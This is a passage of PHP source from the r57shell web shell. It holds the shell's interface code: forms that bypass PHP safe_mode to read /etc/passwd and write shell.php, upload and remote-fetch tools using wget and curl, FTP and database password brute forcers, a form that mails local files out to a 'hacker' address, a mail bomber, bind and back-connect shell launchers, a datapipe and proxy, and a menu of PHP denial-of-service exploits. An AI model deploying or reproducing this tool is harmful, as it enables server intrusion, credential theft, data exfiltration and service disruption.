if(($safe_mode || $open_basedir) && @function_exists('imap_open') && @function_exists('imap_list') && @version_compare(@phpversion(),"5.2.0")<=0){
echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id20').$table_up2.div('id20').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && @function_exists('imap_open') && @function_exists('imap_body') && @version_compare(@phpversion(),"5.2.0")<=0){
echo $fs.$table_up1.div_title($lang[$language.'_text114'],'id21').$table_up2.div('id21').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && @function_exists('copy') && @version_compare(@phpversion(),"5.2.0")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text115'],'id22').$table_up2.div('id22').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST['test8_file1']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));
echo sr(15,"<b>".$lang[$language.'_text117'].$arrow."</b>",in('text','test8_file2',96,(!empty($_POST['test8_file2'])?($_POST['test8_file2']):($dir))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

if(($safe_mode || $open_basedir) && @function_exists('ini_restore') && @version_compare(@phpversion(),"5.2.0")<=0){
echo $fs.$table_up1.div_title($lang[$language.'_text120'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test9_file',96,(!empty($_POST['test9_file'])?($_POST['test9_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test9').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),"5.0.0")<0){
echo $fs.$table_up1.div_title($lang[$language.'_text121'],'id24').$table_up2.div('id24').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test10_file',96,(!empty($_POST['test10_file'])?($_POST['test10_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test10').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && @function_exists('glob') && @version_compare(@phpversion(),"5.2.2")<=0){
echo $fs.$table_up1.div_title($lang[$language.'_text122'],'id19').$table_up2.div('id19').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',96,(!empty($_POST['test18_file'])?($_POST['test18_file']):($dir))).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),"5.2.2")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text130'],'id25').$table_up2.div('id25').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test11_file',96,(!empty($_POST['test11_file'])?($_POST['test11_file']):("/tmp/test.zip"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test11').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),"5.2.2")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text123'],'id26').$table_up2.div('id26').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test12_file',96,(!empty($_POST['test12_file'])?($_POST['test12_file']):("/tmp/test.bzip"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test12').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

if(($safe_mode || $open_basedir) && @function_exists('error_log') && @version_compare(@phpversion(),"5.2.2")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text124'],'id27').$table_up2.div('id27').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test13_file2',96,(!empty($_POST['test13_file2'])?($_POST['test13_file2']):($dir."/shell.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13'));
echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test13_file1',96,(!empty($_POST['test13_file1'])?($_POST['test13_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;  
}

if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),"5.2.2")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text126'],'id28').$table_up2.div('id28').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test14_file2',96,(!empty($_POST['test14_file2'])?($_POST['test14_file2']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test14'));
echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test14_file1',96,(!empty($_POST['test14_file1'])?($_POST['test14_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;  
}

if(($safe_mode || $open_basedir) && @function_exists('readfile') && @version_compare(@phpversion(),"5.2.2")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text127'],'id29').$table_up2.div('id29').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test15_file2',96,(!empty($_POST['test15_file2'])?($_POST['test15_file2']):($dir."/shell.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15'));
echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test15_file1',96,(!empty($_POST['test15_file1'])?($_POST['test15_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;  
}

if(($safe_mode || $open_basedir) && @version_compare(@phpversion(),"5.2.4")<=0)
{
echo $fs.$table_up1.div_title($lang[$language.'_text129'],'id16').$table_up2.div('id16').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test16_file',96,(!empty($_POST['test16_file'])?($_POST['test16_file']):($dir."/test.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test16').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

if(($safe_mode || $open_basedir) && @function_exists('symlink') && @version_compare(@phpversion(),"5.2.2")<=0)
{
echo $table_up1.div_title($lang[$language.'_text131'],'id17').$table_up2.div('id17').$ts;
echo "<tr><td valign=top width=70%>".$ts;
echo sr(20,"<b>".$lang[$language.'_text30'].$arrow."</b>",$fs.in('text','test17_file',60,(!empty($_POST['test17_file'])?($_POST['test17_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_1').in('submit','submit',0,$lang[$language.'_text136']).$fe);
echo $te."</td><td valign=top width=30%>".$ts;
echo sr(0,"",$fs.in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_2').in('submit','submit',0,$lang[$language.'_butt8']).$fe);
echo $te."</td></tr>";
echo $te.'</div>'.$table_end1;  
}

if(($safe_mode || $open_basedir) && @function_exists('symlink') && @version_compare(@phpversion(),"5.2.2")<=0)
{
echo $table_up1.div_title($lang[$language.'_text132'],'id18').$table_up2.div('id18').$ts;
echo "<tr><td valign=top width=70%>".$ts;
echo sr(20,"<b>".$lang[$language.'_text4'].$arrow."</b>",$fs.in('text','test17_file',60,(!empty($_POST['test17_file'])?($_POST['test17_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_1').in('submit','submit',0,$lang[$language.'_text136']).$fe);
echo $te."</td><td valign=top width=30%>".$ts;
echo sr(0,"",$fs.in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_3').in('submit','submit',0,$lang[$language.'_butt8']).$fe);
echo $te."</td></tr>";
echo $te.'</div>'.$table_end1;  
}


if((!@function_exists('ini_get')) || @ini_get('file_uploads')){
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.div_title($lang[$language.'_text5'],'id30').$table_up2.div('id30').$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile0',85,''));
echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}


if((!@function_exists('ini_get')) || @ini_get('file_uploads')){
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.div_title('Multy '.$lang[$language.'_text5'],'id34').$table_up2.div('id34').$ts;
echo "<tr><td valign=top width=50%>".$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile1',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile2',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile3',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile4',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile5',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile6',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile7',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile8',35,''));
echo $te."</td><td valign=top width=50%>".$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile9',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile10',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile11',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile12',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile13',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile14',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile15',35,''));
echo sr(15,'',in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te."</td></tr>";
echo $te.'</div>'.$table_end1.$fe;
}


$select='';
if((!@function_exists('ini_get')) || (@ini_get('allow_url_fopen') && @function_exists('fopen'))){$select = "<option value=\"fopen\">fopen</option>";}
if(!$safe_mode){
 if(which('wget')){$select .= "<option value=\"wget\">wget</option>";}
 if(which('fetch')){$select .= "<option value=\"fetch\">fetch</option>";}
 if(which('lynx')){$select .= "<option value=\"lynx\">lynx</option>";}
 if(which('links')){$select .= "<option value=\"links\">links</option>";}
 if(which('curl')){$select .= "<option value=\"curl\">curl</option>";}
 if(which('GET')){$select .= "<option value=\"GET\">GET</option>";}
}
if($select){
 echo $fs.$table_up1.div_title($lang[$language.'_text15'],'id31').$table_up2.div('id31').$ts;
 echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select size=\"1\" name=\"with\">".$select
."</select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
 echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
 echo $te.'</div>'.$table_end1.$fe;
}

echo $fs.$table_up1.div_title($lang[$language.'_text86'],'id32').$table_up2.div('id32').$ts;
echo sr(15,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo $te.'</div>'.$table_end1.$fe;

if(@function_exists("ftp_connect")){
echo $table_up1.div_title($lang[$language.'_text93'],'id33').$table_up2.div('id33').$ts."<tr>".$fs."<td valign=top width=33%>".$ts;

echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text94']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',20,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').in('hidden','dir',0,$dir));
echo sr(25,"",in('radio','brute_method',0,'passwd',1)."<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href=".$_SERVER['PHP_SELF']."?users>".$lang[$language.'_text95']."</a> )</font>");
echo sr(25,"",in('checkbox','reverse id=reverse',0,'1',1).$lang[$language.'_text101']);
echo sr(25,"",in('radio','brute_method',0,'dic',0).$lang[$language.'_text135']);
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',0,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("root"))));
echo sr(25,"<b>".$lang[$language.'_text135'].$arrow."</b>",in('text','dictionary',0,(!empty($_POST['dictionary'])?($_POST['dictionary']):($dir.'/passw.dic'))));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt1']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text87']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',20,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',20,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',20,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',20,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',20,$dir));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text100']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',20,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',20,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',20,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',20,$dir));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',20,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));

echo $te."</td>".$fe."</tr></div></table>";
}


if(@function_exists("mail")){
echo $table_up1.div_title($lang[$language.'_text102'],'id35').$table_up2.div('id35').$ts."<tr>".$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text103']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',30,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=22 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text104']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',30,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):("file from r57shell"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',30,$dir));
echo sr(25,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text139']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',30,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_bomber').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):("hello billy"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=22 rows=1>'.(!empty($_POST['text'])?($_POST['text']):("flood text here")).'</textarea>');
echo sr(25,"<b>Flood".$arrow."</b>",in('int','mail_flood',5,(!empty($_POST['mail_flood'])?($_POST['mail_flood']):100)).ws(4)."<b>Size(kb)".$arrow."</b>".in('int','mail_size',5,(!empty($_POST['mail_size'])?($_POST['mail_size']):10)));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));

echo $te."</td>".$fe."</tr></div></table>";
}


if($mysql_on||$mssql_on||$pg_on||$ora_on)
{
$select = '<select name=db>';
if($mysql_on) $select .= '<option>MySQL</option>';
if($mssql_on) $select .= '<option>MSSQL</option>';
if($pg_on)    $select .= '<option>PostgreSQL</option>';
if($ora_on)   $select .= '<option>Oracle</option>';
$select .= '</select>';

echo $table_up1.div_title($lang[$language.'_text82'],'id36').$table_up2.div('id36').$ts."<tr>".$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text134']."</div></b></font>";

echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select.in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_brute'));
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',8,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',8,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',8,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(25,"",in('radio','brute_method',0,'passwd',1)."<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href=".$_SERVER['PHP_SELF']."?users>".$lang[$language.'_text95']."</a> )</font>");
echo sr(25,"",in('checkbox','reverse id=reverse',0,'1',1).$lang[$language.'_text101']);
echo sr(25,"",in('radio','brute_method',0,'dic',0).$lang[$language.'_text135']);
echo sr(35,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','mysql_l',8,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(25,"<b>".$lang[$language.'_text135'].$arrow."</b>",in('text','dictionary',0,(!empty($_POST['dictionary'])?($_POST['dictionary']):($dir.'/passw.dic'))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt1']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";

echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',8,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',8,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',8,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',8,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',8,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' <b>.</b> '.in('text','mysql_tbl',8,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1').in('text','dif_name',17,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";

echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',8,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',8,(!empty($_POST['db_port'])?($_POST['db_port']):("3306"))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',8,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',8,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',8,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(35,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."<div align=center id='n'><textarea cols=30 rows=4 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSHOW TABLES;\nSELECT * FROM user;\nSELECT version();\nSELECT user();"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div>";

echo "</td>".$fe."</tr></div></table>";
}



if(!$safe_mode && $unix){
echo $table_up1.div_title($lang[$language.'_text81'],'id37').$table_up2.div('id37').$ts."<tr>".$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',10,'11457'));
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',10,'r57'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe.$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text22']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',10,'11457'));
echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',10,'irc.dalnet.ru'));
echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',10,'6667'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe.$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>Proxy</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','proxy_port',10,'31337'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe."</tr></div></table>";
}

echo $table_up1.div_title($lang[$language.'_text140'],'id38').$table_up2.div('id38').$ts."<tr><td valign=top width=50%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text141']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos1').in('submit','submit',0,'Recursive memory exhaustion').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos2').in('submit','submit',0,'Memory_limit exhaustion in [ pack() ] function').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos3').in('submit','submit',0,'BoF in [ unserialize() ] function').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos4').in('submit','submit',0,'Limit integer calculate (65535) in ZendEngine').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos5').in('submit','submit',0,'SQlite [ dl() ] vulnerability').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos6').in('submit','submit',0,'PCRE [ preg_match() ] exhaustion resources (PHP <5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos7').in('submit','submit',0,'Memory_limit exhaustion in [ str_repeat() ] function (PHP <4.4.5,5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos8').in('submit','submit',0,'Apache process killer').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos9').in('submit','submit',0,'Overload inodes from HD.I via [ tempnam() ] (PHP 4.4.2, 5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos10').in('submit','submit',0,'BoF in [ wordwrap() ] function (PHP <4.4.2,5.1.2)').$fe);
echo $te."</td><td valign=top width=50%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text141']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos11').in('submit','submit',0,'BoF in [ array_fill() ] function (PHP <4.4.2,5.1.2)').$fe);
